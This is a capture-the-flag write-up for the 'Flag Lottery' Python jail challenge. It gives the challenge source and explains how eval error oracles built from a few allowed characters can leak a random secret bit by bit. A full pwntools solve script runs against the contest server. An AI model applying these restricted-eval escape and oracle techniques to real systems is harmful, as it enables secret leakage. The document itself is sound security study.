# Flag Lottery

Category: Gambling, Pyjail

Points: 699

Solves: 6

>i love gambling, don't you?


## TLDR

the characters `[]^>` can be used to leak the secret in `_`.

We have 2 key challenges, accessing the nth byte of `_` and computing the value of the nth byte of `_`

First we can access the nth byte of `_` by doing `_[n]`. To get this `n`, we can first start off with `0` and `1` by using `_>_` and `[_]>[]`. (To avoid operater precedence we wrap them by using `0 : [_>_][_>_]` and `1 : [[_]>[]][_>_]`). Now assuming we have leaked the value of the 0th and 1st byte (discussed next section), we can then run a BFS by going to index of the value of the 1st and 2nd bytes. eg if `_ = 14 34 234 ...` we can go to position 14 and 34. Moreover we can use `>>` to access more numbers such as `7 3` from `14`. Finally, if we still need help we can use `^` to xor known values to achieve new indicies to go to.

To leak the value of the nth byte we will do this bit by bit. To check if the `j`th bit (from lsb) of a number `X` we can do `(X>>j)^1 > (X>>j)`. If the `j`th bit is `1` then the inequality returns `True` otherwise it will return `False`, thus we can leak data by doing `[_][(X>>j)^1 > (X>>j)]` where `True` would do nothing and `False` would error. Doing this for `j = 0..7` allows us to recover the whole byte.

After automating this, we can then just brute force connections until we get the 4 chars `[]>^` took like an hour (1/3060 probability). Then we just run the solve to recover all the bytes and send the secret to the server 100 times which then took another like 2 hours.

![jail start](/images/JailStart.png)
![jail end](/images/JailEnd.png)
![solve reaction](/images/SolveReaction.png)


## Solution
We are given this python source code:

```py
#!/usr/local/bin/python3
import secrets
import random
from lottery_machine import flag

x = [*"%&()*,./:;>[]^{|}~"] # i deleted a bunch of characters because i just dislike them for being too cool.
random.shuffle(x)
charset = x[:4]
print(f'your lucky numbers are: {", ".join([str(ord(i)) for i in charset])}')
charset += ["_"]
count = 0

try:
    while count < 100:
        _ = secrets.token_bytes(128)
        secret = _
        for z in range(1025):
            code = input("cmd: ")
            if code == "submit":
                if input("lottery numbers? ") == secret.hex():
                    count += 1
                else:
                    raise ValueError("the winning ticket was " + secret.hex())
            elif any(i not in charset for i in code):
                raise ValueError("invalid cmd")
            else:
                try:
                    eval(code)
                except:
                    print("answering machine broke.")
except Exception as err:
    print(err)
if count == 100:
    print(f"you won! here is {flag:}")
else:
    print("better luck next time!")
```

Breaking down the code, the first few lines define the character set we may use for the challenge, were it first picks 4 characters randomly from the set `%&()*,./:;>[]^{|}~` and then we are given the 5th character `_`. Then while `count` is less than 100, there is a 128 byte long secret being generated and stored in `_`. We are allowed `1025` tries to figure out what the secret it. In each step, we can either `submit` our guess for the secret, or we can evaluate some code that uses our 5 whitelisted characters. Finally, if we can succesfully guess the secret 100 times, we will get the flag.

First from our investigation, we can infer what the challenge wants us to do. Since we have a secret, we need to someone leak information about this secret. Given the fact that the code contains:

```py
try:
    eval(code)
except:
    print("answering machine broke.")
```

Our goal is to create some code that might work or might not work so that we can leak data based on if the code errors or not. Further, since we are given `1025` attempts this suggests that we need to leak the secret bit by bit as we have `128` bytes times `8` bits per byte plus `1` submit input.

We can now reduce the problem down to given `_` and 4 random characters from our charset, how can we leak the data of the secret stored in `_`. However, we are given the 4 randomly at the start of the instance and they don't get reset. So we will first find any 4 characters that can solve this problem, then we will just keep restarting instances until we get 4 characters that work.

So which 4 characters from `%&()*,./:;>[]^{|}~` would be most useful. Well, we know that we need to be able to get each individual character of the secret `_`. Out of all the characters `[]` look to be the most versitile as we can index lists and create our own lists if needed. 

But we then need a number to be able to index lists. So let's see if we can at least get the numbers 0 and 1 by somehow accessing true of false. Clearly the `>` operator is the only thing useful here as none of the other operators are useful unless you have a number already. With just `[]` and `>` we can already get very far.

We can easily access `True` and `False` by using `[_]>[]` and `_>_`. Moreover, `>` is extremely useful since it can also be used in the bitshift operator `>>`, this seems incredibly useful as we need to leak bits individualy. In fact, if we were given `_[idx]` we can keep shifting `_[idx]>>1>>1...` by 1 in order to get the jth bit to the lowest position. This greatly simplifies the problem as now we have just reduced the problem down.

1. How to access the `i`th element in `_`
2. How to check if a number `x` is odd or even

At first it seems like we are just 1 operator short. We can easily index arbitarily by using `:` while we can use `&^|/*` etc, to check for oddness. (In fact, `:` was extremely close to solving the problem but failed a tiny case explain in the Other Exploration section). The key insight to this, is that we don't have to leak the bytes in order from 0 to 127. We are allowed to jump around leak the 42nd byte then the 67th byte then back to the 37th byte etc. Because after we have accessed the 0th and 1st byte in `_`, we have access to 2 new numbers the value of the first two bytes. While these bytes may we random, we still know their value and can use them to access new indicies. 

The first way to generate new indicies is by using our bitshift operators. Given a known index `_[idx]`, we can then go to the position at `_[idx]`, `_[idx]>>1`, `_[idx]>>2`, etc. Moreover, if we then use some other operator such as `^` from our list, we can then take 2 different known values like `val1^val2` to get more new values. (This can also be done with the other operators but `^` was the most consistent and what ended up being used to solve this problem so I will just focus on `^` for now)

Essentially, we can run a BFS starting from `_[0]` and `_[1]` then finding all indicides connected to it by shifting and xoring known values.

Now we just need to test if a number `x` is odd or not. Recall we only need to check if a number is odd because we can use `>>` to shift any bit to the lsb position for some `_[idx]`. This can easily be achieved with `^` as we know that `0^1 = 1` and `1^1 = 0`. Thus we have that `x^1 > x` iff `x` is odd. We can then leak this data by producing an error on the odd case. if we do `[_][x^1 > x]`, when `x` is even, then the inequality returns `False` so indexing the 0th element is ok. But if `x` is odd, then indexing `True`, the first element is not ok.

Putting it all together we get a solve script:


```py
from pwn import *

mp = {} # Stores all the known values and their corresponding representation with the limited charset

# Return byte at index idx
def getIdx(idx):
    return "_["+mp[idx]+"]"


# Generates payload that includes error condition for the byte at position 'idx', bit at position 'bit'
def genPayload(idx, bit, op):
    # Implemented for other operators as well more explaination in Other Exploration section
    if op == "&":
        return "[_]["+getIdx(idx) + ">>[[_]>[]][_>_]"*(7-bit) + "&"+mp[1]+"]"
    
    if op == "|":
        return "[_]["+getIdx(idx) + ">>[[_]>[]][_>_]"*(7-bit) + "|"+mp[1]+">"+getIdx(idx) + ">>[[_]>[]][_>_]"*(7-bit)+"]"

    if op == "^":
        # Get the byte at idx then shift it over then xor and compare again unxored version. Then try to index [_] by the inequality
        return "[_]["+getIdx(idx) + ">>[[_]>[]][_>_]"*(7-bit) + "^"+mp[1]+">"+getIdx(idx) + ">>[[_]>[]][_>_]"*(7-bit)+"]"


# Define Variables
ITERATIONS = 100
solved = False
cnt = 0
p = None
op = None

# Keep trying until we get desired charset
while True:
    #p = process(["python3", "flaglottery-f123e427c45e/flag_lottery.py"])
    p = remote("challs3.pyjail.club", 24908)
    charset = set(map(lambda x:chr(int(x)),p.recvline().strip().decode().split(":")[1].split(", ")))
    print(charset)
    if set("[]>") < charset:
        op, = charset - set("[]>")
        if op not in "&|^":
            p.close()
        else:
            break
    else:
        p.close()


while not solved:
    # We know how to get 0 and 1
    mp = {
        0: '[_>_][_>_]',
        1: '[[_]>[]][_>_]',   
    }
    
    p.recvuntil(b"cmd: ")

    # Define data we have recieved
    arr = [-1]*128
    notfound = set(range(2,128))

    # Start BFS at 0 and 1
    queue = set([0,1])

    while len(queue) > 0:
        idx = queue.pop()
        val = 0
        for j in range(8):
            # Send payload for leaking jth bit at idx
            p.sendline(genPayload(idx, j, op).encode())
            response = p.recvuntil(b"cmd: ")
            # Calculate the value based on if the eval errors or not
            if op == "&" and b"ans" in response:
                val |= (1 << (7-j))
            elif op == "|" and b"ans" not in response:
                val |= (1 << (7-j))
            elif op == "^" and b"ans" not in response:
                val |= (1 << (7-j))
        
        # Set byte value at idx
        arr[idx] = val

        # Calculate all the new numbers we have access to

        # New values just using bitshift
        new = []
        for j in range(8):
            mp[val>>(j)] = "["+getIdx(idx) + ">>[[_]>[]][_>_]"*j+"][_>_]"
            new.append(val>>j)
            if (val>>j) not in queue and (val>>j) in notfound:
                queue.add(val>>j)
                notfound.remove(val>>j)

        # New values by combing 2 known values with the operator
        newval = dict()
        for v1 in new:
            for v2 in mp:
                v = eval(f"v1 {op} v2")
                if v not in queue and v in notfound:
                    queue.add(v)
                    notfound.remove(v)
                    newval[v] = "["+mp[v1] + op + mp[v2]+"][_>_]"

        # Slower but more comprehensive computation in case we run out of values
        if len(queue) == 0:
            for v1 in mp:
                for v2 in mp:
                    v = eval(f"v1 {op} v2")
                    if v not in queue and v in notfound:
                        queue.add(v)
                        notfound.remove(v)
                        newval[v] = "["+mp[v1] + op + mp[v2]+"][_>_]"

        mp.update(newval)

    # In case some idx couldn't be reached
    if len(notfound) > 0:
        print("FAILED", notfound)
        for i in range(len(notfound)*8):
            p.sendline(b"_")
            p.recvuntil(b"cmd: ")
        p.sendline(b"_")
    
    # Submit the secret
    else:
        p.sendline(b"submit")
        p.recvuntil(b"lottery numbers? ")
        payload = bytes(arr).hex().encode()
        p.sendline(payload)
        cnt += 1
        print(cnt)


    # Stop once we solved 100 times
    if cnt == ITERATIONS: 
        solved = True

# Get Flag
print(p.recvall().decode())
print("DONE")
```


## Other Exploration

You might have noticed that our code also contains the characters `&` and `|`, Just like `^` we can also use these two characters to determine even/oddness while also being able to recover more numbers via BFS. For `|` we can test parity by doing `x|1 > x`, for `&` we can test parity by doing `x&1`. The only issue with these two characters is that given the random bytes in `_`, sometimes some numbers are not reachable no matter how you combine known numbers. The code for handling this is shown below:


```py
# Test parity for & and | operator
if op == "&":
    return "[_]["+getIdx(idx) + ">>[[_]>[]][_>_]"*(7-bit) + "&"+mp[1]+"]"
    
if op == "|":
    return "[_]["+getIdx(idx) + ">>[[_]>[]][_>_]"*(7-bit) + "|"+mp[1]+">"+getIdx(idx) + ">>[[_]>[]][_>_]"*(7-bit)+"]"
```


```py
# In case some idx couldn't be reached
if len(notfound) > 0:
    print("FAILED", notfound)
    for i in range(len(notfound)*8):
        p.sendline(b"_")
        p.recvuntil(b"cmd: ")
    p.sendline(b"_")

# Submit the secret
else:
    p.sendline(b"submit")
    p.recvuntil(b"lottery numbers? ")
    payload = bytes(arr).hex().encode()
    p.sendline(payload)
    cnt += 1
    print(cnt)
```

The problem with this is that since we don't get to increment cnt by 1 consistently, it would take much longer to run. This wouldn't have been a problem, but unfortunately I learned after the contest that there was a timeout of 7777 seconds, which could've explained how this happened.

![Connection Closed at 97%](/images/97percent.png)

Luckily, after getting my connection closed at 97% completion at 2 am, I only had to wait another 2 hours to solve the challenge.


Another interesting discovery, although it ended up being not useful for the challenge was the usage of `:`. 

Using `:`, we can easily index the nth element by simply chaining `[1:]`. For example, `_[1:][1:][1:][1:][0]` can get the 4th element of `_`. The more interesting challenge is to be able to find the even and oddness of a number by using `:`. To do this, we can use the fact that we have a string `_` of length 128, then use some funny string slicing tricks. In python we can do string slicing by using `_[start:stop:step]` Thus we can check the even and oddness of an number by doing `_[:x:x>>1]`. In this case if `x` is odd, then the resulting string will have 3 bytes, but if `x` was even it would only have `2`. To see this, lets take for example the number 7, which when divided by 2 would yield 3. Thus, we would get the indicies 0,3,6 since 7 has an extra bit at the end. Instead if we had the number 6. We would get 0,3 but not 6 since that would be too much. Eg:

```py
>>> [*range(128)][:96:96>>1]
[0, 48]
>>> [*range(128)][:97:97>>1]
[0, 48, 96]
```

 There are only two problems with this approach. The first problem is that the string we are slicing must have at least length `x` in order to test if `x` is even or odd. Since we are setting the stop index to `x`, if `x` is greater than the length, the stop index just becomes the length of the string. Thus the highest number we can test is `127` Eg:

```py
>>> [*range(128)][:196:196>>1]
[0, 98]
>>> [*range(128)][:197:197>>1]
[0, 98]
```
 
The second problem is that this doesn't work when the number you are trying to test is `0` or `1` since the shift would cause the step to be `0` which doesn't make sense. Eg:

```py
>>> [*range(128)][:2:2>>1]
[0, 1]
>>> [*range(128)][:1:1>>1]
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ValueError: slice step cannot be zero
>>> [*range(128)][:0:0>>1]
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ValueError: slice step cannot be zero
```

While this second problem is relatively easy to fix, as we can just test if a number is `0` or `1` by indexing `[_]` with it. Thus we use this technique to locate the MSB of the byte. Then once we know there exists a MSB we can test the rest of the bits with the slicing. However, the first problem can't be fixed which is a problem since each byte takes on a value from `0` to `255`. So in the cases where the random number is greater than `127`, then we have no way to getting the LSB. Here is the failed POC:

```py
one = "[_]>[]"
zero = "_>_"

def getIdx(idx):
    return "_"+"[[_]>[]:]"*idx+"[_>_]"

def genPayload(idx, bit, one):
    # If MSB is not located yet
    if one == False:
        return "[_]["+getIdx(idx)+ ">>[[_]>[]][_>_]"*(7-bit)+"]"

    # Once MSB is located the value will be greater than 1
    else:
        shiftedval = getIdx(idx)+ ">>[[_]>[]][_>_]"*(7-bit)
        return f"_[:{shiftedval}:{shiftedval}>>[[_]>[]][_>_]][[_]>[]:][[_]>[]]"

...
# Loop
    arr = [0]*128
    for i in range(128):
        one = False
        value = 0
        for j in range(8):
            # send payload
            p.sendline(genPayload(i, j, one).encode())
            # logic
            response = p.recvuntil(b"cmd: ")
            if not one:
                if b"ans" in response:
                    one = True
                    value |= (1 << (7-j))
            else:
                if b"ans" not in response:
                    value |= (1 << (7-j))

        arr[i] = value
    print(arr)

```

There are probably more solutions using other characters like `/` or `*`, but at this point the problem has significantly decreased my will to live.
